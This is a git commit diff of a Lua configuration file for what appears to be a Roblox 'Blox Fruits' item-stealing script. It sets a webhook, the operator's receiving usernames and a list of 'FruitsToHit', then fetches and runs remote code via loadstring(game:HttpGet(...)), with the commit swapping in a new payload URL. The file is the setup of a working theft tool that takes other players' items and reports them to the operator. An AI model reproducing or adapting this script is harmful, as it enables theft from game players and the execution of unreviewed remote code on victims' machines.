fffc71e44f1bebae30cd49a8efd18e7d9f7ff00f
TradeZv4 <toonplayz.999@gmail.com>
2025-03-16 17:36:39 +0530

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -2,4 +2,4 @@ Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aGFNWkxnbi01R0R2Z1h
 Usernames = {"Dragon_5ts", "AeroEagle1"} -- << Your username(-s).
 FruitsToHit = {"Buddha-Buddha","Love-Love","Spider-Spider","Sound-Sound","Phoenix-Phoenix","Portal-Portal","Rumble-Rumble","Pain-Pain","Blizzard-Blizzard","Gravity-Gravity","Mammoth-Mammoth","T-Rex-T-Rex","Dough-Dough","Shadow-Shadow","Venom-Venom","Control-Control","Gas-Gas","Spirit-Spirit","Leopard-Leopard","Yeti-Yeti","Kitsune-Kitsune","Dragon-Dragon"} -- << Fruits you want
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TradeZv4/Trading-Script/refs/heads/main/Cods"))()
